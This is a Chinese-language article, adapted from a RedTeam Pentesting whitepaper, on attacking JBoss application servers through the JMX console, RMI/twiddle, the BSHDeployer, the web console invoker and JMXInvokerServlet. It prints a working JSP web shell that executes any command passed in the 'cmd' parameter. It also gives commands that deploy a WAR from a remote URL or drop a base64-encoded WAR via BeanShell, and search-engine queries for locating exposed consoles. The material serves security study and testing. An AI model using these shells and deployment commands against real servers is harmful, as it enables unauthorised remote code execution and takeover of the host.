# JBoss安全问题总结

### 0x00 简介

* * *

JBoss应用服务器（JBoss AS）是一个被广泛使用的开源Java应用服务器。

它是JBoss企业中间件（JEMS）的一部分，并且经常在大型企业中使用。

因为这个软件是高度模块化和松耦合的，导致了它很很复杂，同时也使它易成为攻击者的目标。

本文从攻击者的角度来看，指出JBoss应用服务器存在的潜在风险，并结合例子如何实现如何在JBoss应用服务器上执行任意代码。

### 0x01 JBoss概述

JBoss应用服务器基于Java企业版1.4，并可以在应用在非常多操作系统中，包括Linux，FreeBSD和Windows中，只要操作系统中安装了Java虚拟机。

![enter image description here](http://drops.javaweb.org/uploads/images/a558a45f242341ee7a07c67dc83d9a39e03e3e01.jpg)

JBoss应用服务架构

#### Java管理扩展（JMX）

Java管理扩展（JMX）是一个监控管理Java应用程序的标准化架构，JMX分为三层：

![enter image description here](http://drops.javaweb.org/uploads/images/9cbab6b8f987f752bbca591a365a271838bd467e.jpg)

JMX架构

设备层（Instrumentation Level）：主要定义了信息模型。在JMX中，各种管理对象以管理构件的形式存在，需要管理时，向MBean服务器进行注册。该层还定义了通知机制以及一些辅助元数据类。

代理层（Agent Level）：主要定义了各种服务以及通信模型。该层的核心是一个MBean服务器，所有的管理构件都需要向它注册，才能被管理。注册在MBean服务器上管理构件并不直接和远程应用程序进行通信，它们通过协议适配器和连接器进行通信。而协议适配器和连接器也以管理构件的形式向MBean服务器注册才能提供相应的服务。

分布服务层（Distributed Service Level）：主要定义了能对代理层进行操作的管理接口和构件，这样管理者就可以操作代理。然而，当前的JMX规范并没有给出这一层的具体规范。

#### JMX Invoker

Invokers允许客户端应用程序发送任意协议的JMX请求到服务端。

这些调用都用过MBean服务器发送到响应的MBean服务。

传输机制都是透明的，并且可以使用任意的协议如：HTTP,SOAP2或JRMP3。

#### Deployer架构

攻击者对JBoss应用服务器中的Deployers模块特别感兴趣。

他们被用来部署不同的组成部分。

本文当中重点要将的安装组件：

JAR（Java ARchives）：JAR 文件格式以流行的 ZIP 文件格式为基础。与 ZIP 文件不同的是，JAR 文件不仅用于压缩和发布，而且还用于部署和封装库、组件和插件程序，并可被像编译器和 JVM 这样的工具直接使用。在 JAR 中包含特殊的文件，如 manifests 和部署描述符，用来指示工具如何处理特定的 JAR。

WAR（Web ARchives）：WAR文件是JAR文件包含一个Web应用程序的组件，与Java ServerPages（JSP），Java类，静态web页面等类似。

BSH（BeanSHell scripts）：BeanShell是Java脚本语言，BeanShell脚本使用Java语法，运行在JRE上。

最重要的JBoss应用服务器deployer是MainDeployer。它是部署组件的主要入口点。

传递给MainDeployer的部署组件的路径是一个URL形式：

```
org.jboss.deployment.MainDeployer.deploy(String urlspec)

```

MainDeployer会下载对象，并决定使用什么样的SubDeployer转发。

根据组件的类型，SubDeployer（例如：JarDeployer，SarDeployer等）接受对象进行安装。

为了方便部署，可以使用UrlDeploymentScanner，它同样获取一个URL作为参数：

```
org.jboss.deployment.scanner.URLDeploymentScanner.addURL(String urlspec)

```

传入的URL会被定期的检查是否有新的安装或更改。

这就是JBoss应用服务器如何实现热部署的，有新的或者更改的组件会被自动的部署。

### 0x02 攻击

* * *

#### WAR文件

最简单的在JBoss应用服务器上运行自己的代码是部署一个组件，JBoss可以通过HTTP安装组件。

WAR文件包需要在WEB-INF目录下含一个web.xml文件，在实际的应用程序代码目录之外。

这是一个描述文件，描述了在什么URL将在之后的应用程序中发现。

WAR文件可以用Java的SDK jar命令创建：

```
$ jar cvf redteam.war WEB-INF redteam.jsp

```

redteam.war的结构目录：

```
|-- META-INF
|   -- MANIFEST.MF
|-- WEB-INF
|   -- web.xml 
-- redteam.jsp

```

META-INF/MANIFEST.MF是用jar创建文件时自动创建的，包含JAR的信息，例如：应用程序的主入口点（需要调用的类）或者需要什么额外的类。这里生成的文件中没有什么特别的信息，仅包含一些基本信息：

```
Manifest-Version: 1.0 
Created-By: 1.6.0_10 (Sun Microsystems Inc.) 

```

WEB-INF/web.xml文件必须手动创建，它包含有关Web应用程序的信息，例如JSP文件，或者更详细的应用描述信息，如果发生错误，使用什么图标显示或者错误页面的名称等

```
<?xml version="1.0" ?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
             http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
         version="2.4">
    <servlet>
        <servlet-name>RedTeam Shell</servlet-name>
        <jsp-file>/redteam.jsp</jsp-file>
    </servlet>
</web-app>

```

redteam的内容：

```
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  OutputStream os = p.getOutputStream();
  InputStream in = p.getInputStream();
  DataInputStream dis = new DataInputStream(in);
  String disr = dis.readLine();
  while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
} }
%>

```

HTTP请求：

```
/redteam.jsp?cmd=ls

```

将会列出当前目录所有文件，命令执行后的结果会通过如下代码返回来：

```
while ( disr != null ) {
  out.println(disr);
  disr = dis.readLine();
}

```

#### JMX Console

JMX控制台允许通过web浏览器与JBoss应用服务器直接互动的组件。

它可以方便的管理JBoss服务器，MBean的属性与方法可以直接调用，只要参数中没有复杂的参数类型。

![enter image description here](http://drops.javaweb.org/uploads/images/615b4129c85b00e996be2a935c03c44abf09c817.jpg)

JMX控制台默认界面

这个通常是攻击者第一个目标。

Server- 和ServerInfo-MBean

##### MBeans的属性

```
jboss.system:type=Server
jboss.system:type=ServerInfo

```

展现了JBoss应用服务器与主机系统的信息，包含Java虚拟机以及操作系统的类型版本信息。

![enter image description here](http://drops.javaweb.org/uploads/images/268e1fce00a24c64f7302fd5cc7155019f1144ba.jpg)

MBean的属性

JMX控制台对MBeans可读可操作，不仅包含JBoss应用服务器本身的信息，同时包含主机信息，这些有助于进一步攻击。

MBean的shutdown()方法可以关闭JBoss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。

##### redteam.war安装

MainDeployer的方法属性可以在JMX控制台中的jboss.system中调用。

deploy()方法可以由一个URL中一个参数调用，URL指向WAR文件，需要是服务器能够访问到的地址。

当invoke按钮被点击时，JBoss应用服务器会下载WAR文件并安装它，之后，就可以执行shell命令了

![enter image description here](http://drops.javaweb.org/uploads/images/309f2a996365fe65460250451a4f6deb77d2b724.jpg)

deploy()方法

![enter image description here](http://drops.javaweb.org/uploads/images/604294c8e9a092db5942c28e9106f59a8cadae79.jpg)

JBoss应用程序执行ls -l命令

#### RMI: 远程方法调用

通常JMX控制台保护方法是加一个密码保护。

然而这不是访问JBoss应用服务器组件的唯一方式，JBoss应用服务器经常与客户端程序接口相互调用，Java远程方法调用（RMI）也发挥重要作用。

使用RMI，本地应用程序可以访问远程对象，并可以调用它们的方法。客户端与服务器之间的通信是透明的。

JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。

JNDI可访问的现有的目录及服务有：

DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&v2、NIS。

##### 通过RMI访问MBean

RMI接口默认凯奇在端口4444上，JNDI接口默认开启在1098和1099上。

与JBoss应用服务器RMI通信，可以使用专门的Java程序。更简单的方式是使用twiddle，包括JBoss应用服务器的安装。

```
$ sh jboss-4.2.3.GA/bin/twiddle.sh -h
A JMX client to ’twiddle’ with a remote JBoss server.
usage: twiddle.sh [options] <command> [command_arguments]
options:
    -h, --help                   Show this help message
        --help-commands          Show a list of commands
    -H=<command>                 Show command specific help
-c=command.properties            Specify the command.properties file to use
-D<name>[=<value>]               Set a system property
--                               Stop procession options
-s, --server=<url>               The JNDI URL of the remote server
-a, --adapter=<name>             The JNDI name of the RMI adapter to user
-u, --user=<name>                Specify the username for authentication
-p, --password=<name>            Specify the password for authentication
-q, --quiet                      Be somewhat more quiet

```

有了twiddle，就用可用命令行通过RMI调用JBoss应用服务器的MBeans。Windows下是twiddle.bat，Linux下是twiddle.sh来启动twiddle。类似于JMX控制台，MBEAN的属性可读可改，并且可以调用其方法。

显示MBean服务器的信息

```
$ ./twiddle.sh -s scribus get jboss.system:type=ServerInfo
ActiveThreadCount=50
AvailableProcessors=1
OSArch=amd64
MaxMemory=518979584
HostAddress=127.0.1.1
JavaVersion=1.6.0_06
OSVersion=2.6.24-19-server
JavaVendor=Sun Microsystems Inc.
TotalMemory=129957888
ActiveThreadGroupCount=7
OSName=Linux
FreeMemory=72958384
HostName=scribus
JavaVMVersion=10.0-b22
JavaVMVendor=Sun Microsystems Inc.
JavaVMName=Java HotSpot(TM) 64-Bit Server VM

```

##### 安装redteam.war

根据twiddle的帮助利用deploy()方法安装war文件。

```
$ ./twiddle.sh -s scribus invoke jboss.system:service=MainDeployer deploy http://www.redteam-pentesting.de/redteam.war

```

通过下面的URL访问shell：

```
http://scribus:8080/redteam/redteam-shell.jsp

```

#### BSHDeployer

利用RMI攻击需要JBoss应用服务器能够访问远程HTTP服务器。

然而在很多配置中，防火墙不允许JBoss服务器对外发出连接请求：

![enter image description here](http://drops.javaweb.org/uploads/images/fbc28d28ef448e28c8c973bfaf88a8df6c4390cd.jpg)

为了能够在JBoss服务器上安装redteam.war，这个文件需要放在本地。

虽然JBoss不允许直接直接上传文件，但是有BeanShellDeployer，我们可以在远程服务器上创建任意文件。

##### BeanShell

BeanShell是一种运行在JRE上的脚本语言，该语言支持常规的Java语法。可以很快写完，并且不需要编译。

##### BSHDeployer

JBoss服务器中BSHDeployer可以部署BeanShell脚本，它会安装后自动执行。

利用BSHDeployer安装的方法是：

```
createScriptDeployment(String bshScript, String scriptName)

```

##### BeanShell脚本

可以用下面的BeanShell脚本实现把redteam.war放到JBoss服务器上。

```
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;
// Base64 encoded redteam.war
String val = "UEsDBBQACA[...]AAAAA";
BASE64Decoder decoder = new BASE64Decoder();
byte[] byteval = decoder.decodeBuffer(val);
FileOutputStream fs = new FileOutputStream("/tmp/redteam.war");
fs.write(byteval);
fs.close();

```

变量val中是redteam.war文件的base64编码后的字符串，脚本在tmp目录下生成redteam.war文件，Windows中可以填写C:WINDOWSTEMP。

##### 安装redteam.war文件

利用twiddle，可以使用DSHDeployer的createScriptDeployement()方法：

```
$ ./twiddle.sh -s scribus invoke jboss.deployer:service=BSHDeployer createScriptDeployment "‘cat redteam.bsh‘" redteam.bsh 

```

tedteam.bsh包含上面的BeanShell脚本，调用成功后JBoss服务器返回BeanShell创建的临时文件地址：

```
file:/tmp/redteam.bsh55918.bsh 

```

当BeanShell脚本执行部署后，会创建/tmp/redteam.war文件，现在就可以通过调用本地文件来部署了：

```
$ ./twiddle.sh -s scribus invoke jboss.system:service=MainDeployer deploy file:/tmp/redteam.war 

```

之后就可以访问redteam-shell.jsp来执行命令了。

#### Web Console Invoker

通过JMX控制台与RMI来控制JBoss服务器是最常用的方法。

除了这些还有更隐蔽的接口，其中之一就是Web控制台中使用JMXInvoker。

##### Web控制台

Web控制台与JMX控制台类似，也可以通过浏览器访问。

Web控制台的默认界面：

![enter image description here](http://drops.javaweb.org/uploads/images/bfd09f0647f5f2ae88f7cd9ebc2eca7955aa619b.jpg)

如果JMX控制台有密码保护的话，是不可以通过Web控制台访问MBean的函数的，需要登陆后才能访问。

##### Web控制台JMX Invoker

Web控制台除了可以看到组建的梳妆接口与JBoss服务器信息外，还可监视MBean属性的实时变化。

访问URL：

```
http://$hostname/web-console/Invoker 

```

这个Invoker其实就是JMX Invoker，而不局限于Web控制台提供的功能。

默认情况下，访问是不受限制的，所以攻击者可以用它来发送任意的JMX命令到JBoss服务器。

##### 安装redteam.war

用Web控制台的Invoker安装redteam.war文件。

webconsole_invoker.rb可以直接调用Web控制的JMX Invoker，使用的Java类是：org.jboss.console.remote.Util

Util.class文件属于JBoss服务器的JAR文件：console-mgr-classes.jar，它提供的方法：

```
public static Object invoke(
    java.net.URL externalURL,
    RemoteMBeanInvocation mi)
public static Object getAttribute(
    java.net.URL externalURL,
    RemoteMBeanAttributeInvocation mi)

```

通过Web控制台Invoker可以读取MBean的属性与invoke方法。

这个类可以通过webconsole_invoker.rb脚本使用，使用方法如下：

```
$ ./webconsole_invoker.rb -h
Usage: ./webconsole_invoker.rb [options] MBean
￼-u, --url URL  The Invoker URL to use (default:http://localhost:8080/web-console/Invoker)
-a, --get-attr ATTR             Read an attribute of an MBean
-i, --invoke METHOD             invoke an MBean method
-p, --invoke-params PARAMS      MBean method params
-s, --invoke-sigs SIGS          MBean method signature
-t, --test                      Test the script with the ServerInfo MBean
-h, --help                      Show this help

Example usage:
./webconsole_invoker.rb -a OSVersion jboss.system:type=ServerInfo
./webconsole_invoker.rb -i listThreadDump jboss.system:type=ServerInfo
./webconsole_invoker.rb -i listMemoryPools -p true -s boolean jboss.system:type=ServerInfo 

```

通过如下命令利用BSHDeployer来安装redteam.war文件。

```
$ ./webconsole_invoker.rb -u http://scribus:8080/web-console/Invoker -i createScriptDeployment -s "java.lang.String","java.lang.String" -p "`cat redteam.bsh`",redteam.bsh jboss.deployer:service=BSHDeployer

```

在远程服务器上创建一个本地的redteam.war文件，现在第二部就可以利用MainDeployer安装/tmp/redteam.war文件了。

```
$ ./webconsole_invoker.rb -u http://scribus:8080/web-console/Invoker -i deploy -s "java.lang.String" -p "file:/tmp/redteam.war" jboss.system:service=MainDeployer

```

redteam-shell.jsp又可以访问了。

#### JMXInvokerServlet

之前提到过JBoss服务器允许任何协议访问MBean服务器，对于HTTP，JBoss提供HttpAdaptor。

默认安装中，HttpAdaptor是没有启用的，但是HttpAdaptor的JMX Invoker可以通过URL直接访问。

```
http://$hostname/invoker/JMXInvokerServlet 

```

这个接口接受HTTP POST请求后，转发到MBean，因此与Web控制台Invoker类似，JMXInvokerServlet也可以发送任意的JMX调用到JBoss服务器。

##### 创建MarshalledInvocation对象

JMXInvokerServlet的调用与Web控制台Invoker不兼容，所以不能使用webconsole_invoker.rb脚本调用。

MarshalledInvocation对象通常只在内部JBoss服务器上做交流。

httpinvoker.rb脚本与webconsole_invoker.rb脚本类似，但是需要JBoss服务器激活HttpAdaptor

```
$ ./httpinvoker.rb -h
Usage: ./httpinvoker.rb [options] MBean
￼-j, --jndi URL               The JNDI URL to use (default:http://localhost:8080/invoker/JNDIFactory)
-p, --adaptor URL            The Adaptor URL to use (default:jmx/invoker/HttpAdaptor)
-a, --get-attr ATTR          Read an attribute of an MBean
-i,  --invoke METHOD         invoke an MBe an method          
     --invoke-params PARAMS  MBean method params
-s, --invoke-sigs SIGS       MBean method signature
-t, --test                   Test the script with the ServerInfo MBean
-h, --help                   Show this help

```

##### 安装tedteam.war

与webconsole_invoker.rb安装类似。

寻找JBoss服务器的方法：

```
inurl:"jmx-console/HtmlAdaptor"
intitle:"Welcome to JBoss"

```

From:[Whitepaper_Whos-the-JBoss-now_RedTeam-Pentesting_EN](http://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper_Whos-the-JBoss-now_RedTeam-Pentesting_EN.pdf)